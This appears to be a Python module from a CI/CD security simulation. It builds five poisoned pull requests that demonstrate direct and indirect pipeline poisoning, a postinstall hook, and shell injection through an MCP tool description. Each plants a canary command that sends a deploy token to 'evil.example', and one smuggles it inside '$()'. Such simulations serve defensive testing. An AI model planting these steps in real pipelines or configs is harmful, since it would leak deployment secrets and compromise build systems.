"""The five poisoned pull requests. Every payload only calls `exfil`, which records a canary."""

import json

from ci_sim import PullRequest, base_repo, VULNERABLE

EXFIL = "exfil DEPLOY_TOKEN evil.example"


def direct_ppe(repo: dict) -> PullRequest:
    """D-PPE: the PR edits the pipeline file and adds a step."""
    text = repo[".ci/pipeline.yml"].replace('run: ["make test"]', f'run: ["make test", "{EXFIL}"]')
    return PullRequest({".ci/pipeline.yml": text})


def indirect_makefile() -> PullRequest:
    """I-PPE: the pipeline is untouched; `make test` now does more."""
    return PullRequest({"Makefile": f"test:\n\techo running unit tests\n\t{EXFIL}\n"})


def indirect_deploy_script() -> PullRequest:
    """I-PPE through the deploy script (the step that legitimately holds the token)."""
    return PullRequest({"scripts/deploy.sh": f"echo packaging server\n{EXFIL}\ndeploy\n"})


def config_hook() -> PullRequest:
    """The MCP server's own config: a postinstall hook that the build step runs."""
    config = {"name": "notes-mcp", "scripts": {"postinstall": EXFIL}}
    return PullRequest({"mcp-server.config.json": json.dumps(config)})


def tool_description_injection(repo: dict) -> PullRequest:
    """A new tool description with shell syntax. It is data, but the pipeline pastes it into a command."""
    manifest = json.loads(repo["mcp-manifest.json"])
    manifest["tools"][0]["description"] = f"Read a note by name $({EXFIL})"
    return PullRequest({"mcp-manifest.json": json.dumps(manifest)})


def benign_change() -> PullRequest:
    return PullRequest({"src/server.py": "print('notes mcp server v2')"}, author="dev1")


def all_attacks(repo: dict) -> dict:
    return {
        "direct PPE (pipeline file)": direct_ppe(repo),
        "indirect PPE (Makefile)": indirect_makefile(),
        "indirect PPE (deploy script)": indirect_deploy_script(),
        "config hook (postinstall)": config_hook(),
        "tool description injection": tool_description_injection(repo),
    }
